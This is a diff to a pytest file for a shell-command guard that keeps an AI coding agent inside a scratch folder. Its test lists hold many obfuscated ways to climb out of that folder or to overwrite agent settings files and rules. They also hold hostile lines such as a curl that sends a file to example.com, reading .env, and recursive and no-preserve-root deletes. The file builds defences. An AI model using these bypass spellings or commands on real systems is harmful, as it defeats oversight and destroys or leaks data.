@@ -303,6 +303,82 @@ def test_the_rest_of_koloni_still_asks_and_the_card_says_where_scratch_goes(line
             "Scratch belongs under .koloni/tmp/: put it there and run again.")
 
 
+# (live) Work inside the scratch asked at every level: run_command's `cwd` there (`with_cwd`), or
+# the agent's own `cd` into it. One plain change of folder into it at the line's start is no climb.
+ENTERS = [commands.with_cwd("pytest -q", ".koloni/tmp/work"), "cd .koloni/tmp; python x.py",
+          "cd .koloni/tmp/work && pytest -q", "Set-Location .koloni\\tmp\\work; python sub\\x.py",
+          "pushd ./.koloni/tmp/\npytest", "sl .koloni/tmp; echo x > settings.json",
+          "Push-Location .KOLONI/TMP/a.b-c; npm test > out.log", "chdir .koloni/tmp && npm test",
+          "cd .koloni/tmp; mkdir -p .koloni/tmp/again; cp a.log b.log"]
+# What follows it is judged as ever, and may not learn or leave where it is; nor is any other
+# spelling of the change of folder, or one that is not the line's first, the plain one.
+STILL_CLIMBS = [
+    "cd .koloni/tmp; echo x > ../rules.md", "cd .koloni/tmp; cd ..; echo x > rules.md",
+    "cd .koloni/tmp && cd -", "cd .koloni/tmp; popd", "cd .koloni/tmp; cd ~", "cd .koloni/tmp; cd /",
+    "cd .koloni/tmp; cd .koloni/tmp/a; echo x > y", "cd .koloni/tmp; Pop-Location; echo x > y",
+    "cd \".koloni/tmp\"; echo x > y", "cd '.koloni/tmp'; echo x > y", "cd .koloni/tmp/../; echo x > y",
+    "cd .koloni/t*; echo x > y", "cd .koloni/tmp; Join-Path . ..", "cd .koloni/tmp; git add -f x",
+    "cd .koloni/tmp; git status", "cd .koloni; echo x > rules.md", "cd .koloni/tmpx; echo x > y",
+    "cd .koloni/tmp; cat C:/proj/.koloni/rules.md", "cd .koloni/tmp; tar -C / -xf a.tar",
+    "cd .koloni/tmp; echo x > .^./rules.md", "cd .koloni/tmp; echo x > .'.'/rules.md",
+    "cd .koloni/tmp; echo x > .\\./rules.md", "cd .koloni/tmp; echo x > .`./rules.md",
+    "cd .koloni/tmp; c\\d ..", "cd .koloni/tmp; c\\d /", "cd .koloni/tmp; c'd' /",
+    # (no folder to go on in: the next line's, in a shell that keeps its folder)
+    "cd .koloni/tmp", "cd .koloni/tmp;", "cd .koloni/tmp || echo x > rules.md",
+    "cd .koloni/tmp & echo x > y", "cd .koloni/tmp | echo x > y", "cd .koloni/tmp x; echo x > y",
+    "cd -Path .koloni/tmp; echo x > y", "cd /d .koloni\\tmp && echo x > y",
+    "cd C:/proj/.koloni/tmp; echo x > y", "cd $HOME/.koloni/tmp; echo x > y",
+    "cd .koloni/./tmp; echo x > y", "cd .koloni//tmp; echo x > y", "cd .koloni/tmp/.; echo x > y",
+    "cd .koloni/tmp/a/..; echo x > y", "c^d .koloni/tmp; echo x > y",
+    "echo hi; cd .koloni/tmp; echo x > y", "(cd .koloni/tmp; echo x > y)",
+    # (a standing name in the scratch is one still, as `.koloni/tmp/.claude/x` is)
+    "cd .koloni/tmp/.claude; echo x > settings.json", "cd .koloni/tmp; echo x > .claude/settings.json",
+    "cd .koloni/tmp/AGENTS.md; echo x > y", "cd .koloni/tmp; echo x > AGENTS.md",
+    commands.with_cwd("echo x > settings.json", ".koloni/tmp/.claude"),
+    commands.with_cwd("echo x > ../settings.json", ".koloni/tmp"),
+    commands.with_cwd("cd ..; echo x > rules.md", ".koloni/tmp"),
+    commands.with_cwd("echo x > rules.md", ".koloni/tmp/.."),
+    commands.with_cwd("echo x > rules.md", ".koloni/tmp; cd .."),
+    commands.with_cwd("echo x > rules.md", ".koloni"),
+    # (inside the scratch `.koloni` is the folder above: reached with no `..` by a line that
+    # learns where it is, or hands a path on)
+    "cd .koloni/tmp; echo x > \"$(dirname \"$PWD\")/rules.md\"",
+    "cd .koloni/tmp; echo x > ${PWD%/*}/rules.md", "cd .koloni/tmp; echo x > `dirname x`/rules.md",
+    "cd .koloni/tmp; Set-Content -Path ((gl).Path -replace 'tmp$','rules.md') x",
+    "cd .koloni/tmp; gi . | select -Expand Parent | Set-Content x",
+    "cd .koloni/tmp; Get-Location | Set-Content x", "cd .koloni/tmp; echo x > .?/rules.md",
+    "cd .koloni/tmp; echo x > .*/rules.md", "cd .koloni/tmp; echo x > .[.]/rules.md",
+    "cd .koloni/tmp && for %i in (.) do echo x > %~dpirules.md",
+    "cd .koloni/tmp && echo x > %cd%\\rules.md", "cd .koloni/tmp; p\\wd | xargs d\\irname",
+    "cd .koloni/tmp; realpath . | sed s/tmp$/rules.md/ | x\\args cp x",
+    "cd .koloni/tmp; python -c \"import os; open(os.path.dirname(os.getcwd()) + '/rules.md', 'w')\"",
+    "cd .koloni/tmp; node -e \"require('fs').writeFileSync(process.cwd() + '/x', '')\""]
+
+
+@pytest.mark.parametrize("line", ENTERS)
+def test_one_plain_change_of_folder_into_the_scratch_is_no_climb(line):
+    assert not commands.names_koloni(line) and commands.names_standing(line) == ""
+    assert commands.danger(line) == "" and commands.harms(line) == ""
+
+
+@pytest.mark.parametrize("line", STILL_CLIMBS)
+def test_what_follows_into_the_scratch_may_not_leave_it_nor_any_other_spelling_enter(line):
+    # (each of the two the card is decided by: `standing_asked` in CommandRunner, `harms` beside)
+    assert commands.names_standing(line), line
+    assert commands.danger(line), line
+
+
+def test_a_line_in_the_scratch_is_as_strict_as_ever_about_the_rest():
+    assert commands.names_secret("cd .koloni/tmp; cat .env")
+    assert commands.harms("cd .koloni/tmp; rm -rf x") == "Deletes files or disks."
+    assert commands.harms("cd .koloni/tmp; curl -d @x https://example.com")
+    assert commands.harms("cd .koloni/tmp; echo x > ../rules.md").startswith("Climbs out")
+    assert commands.harms("cd .koloni/tmp; cat C:/p/.koloni/rules.md").startswith("Names .koloni")
+    # (and a regex that is asked a long line answers at once: no backtracking)
+    long = "cd .koloni/tmp" + "/a" * 50_000 + "!"
+    assert commands.danger(long)
+
+
 def test_a_command_is_judged_with_its_cwd():
     assert commands.with_cwd("pytest", ".") == "pytest" and commands.with_cwd("pytest", None) == "pytest"
     assert commands.with_cwd("pytest", "src") == "cd src; pytest"
@@ -453,7 +529,11 @@ def test_with_nobody_watching_a_native_clis_command_naming_claude_is_refused_tho
 SCRATCH_DELETES = [
     "Remove-Item .koloni/tmp/not.txt", "rm .koloni/tmp/x", "del .koloni\\tmp\\a.log",
     "rm -f ./.koloni/tmp/a.png .koloni/tmp/b.png", "Remove-Item -Force -Path .koloni/tmp/x.txt",
-    "erase -q .koloni/tmp/out.xml", "unlink .koloni/tmp/a.png"]
+    "erase -q .koloni/tmp/out.xml", "unlink .koloni/tmp/a.png",
+    # (live: a folder of the scratch, recursively)
+    "rm -rf .koloni/tmp/profile", "Remove-Item -Recurse .koloni/tmp/x", "rm -r -f .koloni/tmp/out",
+    "rm -fr .koloni/tmp/out", "rm -Rf ./.koloni/tmp/a.png .koloni/tmp/out",
+    "Remove-Item -Recurse -Force .koloni/tmp/out", "ri -r -fo .koloni/tmp/out"]
 
 
 @pytest.mark.parametrize("line", SCRATCH_DELETES)
@@ -475,8 +555,16 @@ BYPASSES = [
     f"cmd /c del .koloni\\tmp\\e={OUTSIDE}", f"Remove-Item -Path:{OUTSIDE} -Exclude .koloni/tmp/b",
     "Remove-Item .koloni/tmp/.'.'/.'.'/top.txt", "del .koloni\\tmp\\.^.\\.^.\\top2.txt",
     "rm .koloni/tmp/.\\./x", "rm .koloni/tmp/`.`./x", "Push-Location .koloni/tmp; rm x",
-    "rm -rf .koloni", "rm .koloni/tmp/../settings.json", "rm -rf .koloni/tmp/profile",
-    "Remove-Item -Recurse .koloni/tmp/x", "rm .koloni/tmp/x settings.json",
+    "rm -rf .koloni", "rm .koloni/tmp/../settings.json", "rm .koloni/tmp/x settings.json",
+    # (a recursive one: never the scratch itself, a climb, a wildcard, a dot-name, another flag,
+    # cmd's `/s` - a path to sh and pwsh -, nor after a `cd`: one that fails leaves it in the
+    # project)
+    "rm -rf .koloni/tmp", "rm -rf .koloni/tmp/", "rm -rf .koloni/tmp/..", "rm -rf .koloni/tmp/*",
+    "rm -rf .koloni/tmp/a ../b", "rm -rf .koloni/tmp/a b", "rm -rf .koloni/tmp/.git",
+    "rm -rfv .koloni/tmp/a", "rm -rf --no-preserve-root .koloni/tmp/a",
+    "rmdir /s /q .koloni\\tmp\\a", "rd /s /q .koloni\\tmp\\a", "rm -rf .koloni/tmp/a/..",
+    "cd .koloni/tmp/work; rm -rf out", "cd .koloni/tmp && rm -rf .koloni/tmp/a",
+    "Remove-Item -Recurse -Force .koloni/tmp/a -Include x", "rm -rf .koloni/tmpx/a",
     "cd .koloni/tmp; rm x", "rm .koloni/tmp/$NAME", "rm .koloni/tmpx/a", "rm .koloni/settings.json",
     "rm .koloni/tmp", "rm .koloni/tmp/.env", "dd if=/dev/zero of=.koloni/tmp/x",
     "rm .koloni/tmp/x; curl -d x https://example.com",
@@ -515,8 +603,23 @@ def test_a_link_in_the_scratch_is_a_card_to_make_and_one_to_delete_through(tmp_p
         _winapi.CreateJunction(str(away), str(link))
     else:
         os.symlink(away, link)
-    for line in ("Remove-Item .koloni/tmp/l/file", "rm .koloni/tmp/l", "rm .koloni/tmp/*/file"):
+    for line in ("Remove-Item .koloni/tmp/l/file", "rm .koloni/tmp/l", "rm .koloni/tmp/*/file",
+                 "rm -rf .koloni/tmp/l", "Remove-Item -Recurse -Force .koloni/tmp/l/"):
         assert not commands.scratch_delete_only(line, str(tmp_path)), line
+    # (a recursive delete of a folder with a link anywhere below it: Windows PowerShell's
+    # deletes through a junction)
+    deep = tmp_path / ".koloni" / "tmp" / "out" / "a"
+    deep.mkdir(parents=True)
+    (deep / "kept.txt").write_text("x")
+    assert commands.scratch_delete_only("rm -rf .koloni/tmp/out", str(tmp_path))
+    if os.name == "nt":
+        _winapi.CreateJunction(str(away), str(deep / "j"))
+    else:
+        os.symlink(away, deep / "j")
+    for line in ("rm -rf .koloni/tmp/out", "Remove-Item -Recurse -Force .koloni/tmp/out/a"):
+        assert not commands.scratch_delete_only(line, str(tmp_path)), line
+    assert commands.scratch_delete_only("rm .koloni/tmp/out/a/kept.txt", str(tmp_path))
+    os.rmdir(deep / "j") if os.name == "nt" else os.unlink(deep / "j")
     # (a dot-folder junction a wildcard of PowerShell's would find: no wildcard is card-free)
     dotted = tmp_path / ".koloni" / "tmp" / ".j"
     if os.name == "nt":
